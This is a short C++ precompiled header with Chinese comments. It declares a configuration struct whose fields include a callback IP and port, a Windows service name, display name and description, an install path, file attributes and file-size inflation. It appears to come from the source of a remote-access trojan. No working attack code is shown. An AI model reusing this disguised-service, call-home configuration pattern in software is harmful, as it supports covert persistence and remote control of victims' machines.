// stdafx.h : 标准系统包含文件的包含文件，
// 或是经常使用但不常更改的
// 特定于项目的包含文件
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             //  从 Windows 头文件中排除极少使用的信息
// Windows 头文件:
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "ClientSocket.h"
#include <WtsApi32.h>
#include <shlwapi.h>

#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "Shlwapi.lib")


struct HP_STAR
{
	TCHAR Loginip[100];      //ip
	DWORD LoginPort;	     //端口
	TCHAR strRemark[32];     //版本
	TCHAR UpGroup[50];       //分组
	TCHAR szGetGroup[256];  //分组唯一标识
	BOOL  bRunOnce;         //是否为绿色安装
	TCHAR SerName[100];     //服务名称
	TCHAR Serdisplay[128];  //显示名称
	TCHAR Serdesc[256];     //服务描述
	TCHAR ReleasePath[100]; //安装途径
	TCHAR ReleaseName[50];  //安装名称
	WORD  FileAttribute;    //文件属性
	WORD  Dele_zd;          //安装增大
};

// TODO: 在此处引用程序需要的其他头文件
